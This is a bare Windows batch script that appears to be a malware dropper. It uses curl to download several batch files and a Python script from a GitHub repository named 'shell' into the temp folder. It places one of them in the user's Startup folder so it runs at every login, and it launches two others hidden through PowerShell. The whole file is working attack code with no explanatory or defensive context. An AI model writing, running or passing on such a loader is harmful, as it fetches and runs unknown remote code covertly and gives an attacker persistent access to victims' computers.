
@echo off
curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.bat -o %temp%\vb.bat
curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb1.bat -o "%temp%\vb1.bat"
curl https://raw.githubusercontent.com/omarsamyX0/shell/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat"
curl https://raw.githubusercontent.com/omarsamyX0/shell/main/start.bat -o "%temp%\start.bat"
move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
powershell -c "Start-Process -FilePath "%temp%\vb1.bat" -WindowStyle Hidden"
exit
